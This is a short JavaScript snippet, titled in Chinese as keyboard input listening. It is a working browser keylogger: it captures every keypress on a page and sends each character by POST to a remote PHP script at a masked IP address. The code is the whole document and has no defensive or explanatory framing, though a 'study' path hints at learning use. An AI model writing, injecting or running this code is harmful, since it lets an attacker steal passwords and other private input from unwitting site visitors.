键盘输入监听
document.onkeypress = function(evt) {
evt = evt || window.event
key = String.fromCharCode(evt.charCode)
if (key) {
console.log(key);
var http = new XMLHttpRequest();
var param = encodeURI(key)
http.open("POST","http://xxx.xx.xx.xx/study/Keylogger/keylogger.php",true);
http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
http.send("key="+param);
}
}
